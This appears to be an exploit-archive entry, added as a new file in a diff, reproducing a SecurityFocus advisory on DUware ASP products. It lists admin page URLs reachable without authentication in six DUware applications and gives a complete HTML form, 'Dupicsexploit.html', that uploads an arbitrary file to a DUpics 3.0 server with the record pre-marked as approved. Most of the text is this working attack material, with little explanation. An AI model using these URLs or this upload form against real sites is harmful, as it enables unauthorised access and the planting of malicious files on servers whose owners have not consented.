@@ -1,0 +1,73 @@
+source: http://www.securityfocus.com/bid/9462/info
+
+It has been reported that various DUware products may be prone to an access validation issue allowing a remote attacker to gain access to sensitive resources by bypassing authentication. An arbitrary file upload vulnerability has been specified in DUpics that may allow a remote attacker to upload files to a vulnerable system. 
+
+Successful exploitation of these issue may allow an attacker to gain unauthorized access to sensitive resources and upload arbitrary files to the host. An attacker can exploit this vulnerability to upload malicious applications to the vulnerable system.
+
+- http://www.example.com/admin/inc_edit.asp?iEve=1
+- http://www.example.com/admin/inc_events.asp
+- http://www.example.com/admin/inc_type.asp
+
+
+DUclassified :
+- http://www.example.com/admin/inc_cats.asp
+- http://www.example.com/admin/inc_users.asp
+- http://www.example.com/admin/inc_user_edit.asp?id=admin
+
+DUdirectory :
+- http://www.example.com/admin/inc_links.asp
+- http://www.example.com/admin/inc_edit.asp?iLink=10
+- http://www.example.com/admin/inc_type.asp
+
+DUdownload :
+- http://www.example.com/admin/inc_files.asp
+- http://www.example.com/admin/inc_edit.asp?iFile=50
+- http://www.example.com/admin/inc_type.asp
+
+DUgallery :
+- http://www.example.com/admin/inc_pictures.asp
+- http://www.example.com/admin/inc_edit.asp?iPic=100
+- http://www.example.com/admin/inc_type.asp
+
+DUpics :
+- http://www.example.com/admin/inc_add.asp
+- http://www.example.com/admin/inc_pics.asp
+- http://www.example.com/admin/inc_edit.asp?iPic=500
+- http://www.example.com/admin/inc_type.asp
+
+DUportal :
+- http://www.example.com/admin/inc_channel_listing.asp
+- http://www.example.com/admin/inc_channel_edit.asp?iChannel=5
+- http://www.example.com/admin/inc_config.asp
+- http://www.example.com/admin/inc_users.asp
+- http://www.example.com/admin/inc_users_edit.asp?iUser=admin
+
+
+
+Arbitrary File Upload :
+
+DUpics :
+
+------------------Dupicsexploit.html------------------
+<html>
+<head><title>DUpics 3.0 Arbitrary File Upload Exploit</title></head>
+<body>
+<form action="/admin/inc_add.asp?GP_upload=true" method="post" 
+enctype="multipart/form-data" 
+onsubmit="this.action=this.url.value+this.action;alert('Your file will be 
+uploaded to '+this.url.value+'/pictures/');">
+Target URL : <input type="text" name="url" 
+value="http://[target]/DUpics/"><br>
+FILE : <input name="PIC_IMAGE" type="file"><br>
+<input type="hidden" name="PIC_NAME" value="admin">
+<input type="hidden" name="PIC_WIDTH">
+<input type="hidden" name="PIC_HEIGHT">
+<input type="hidden" name="PIC_APPROVED" value="1">
+<input type="hidden" name="MM_insert" value="true">
+<input type="submit" value="Upload" name="submit">
+</form>
+<p align="right">For more informations about this exploit : 
+<a href="http://www.example.com" 
+target="_blank"> www.example.com</a></p>
+</body>
+</html>
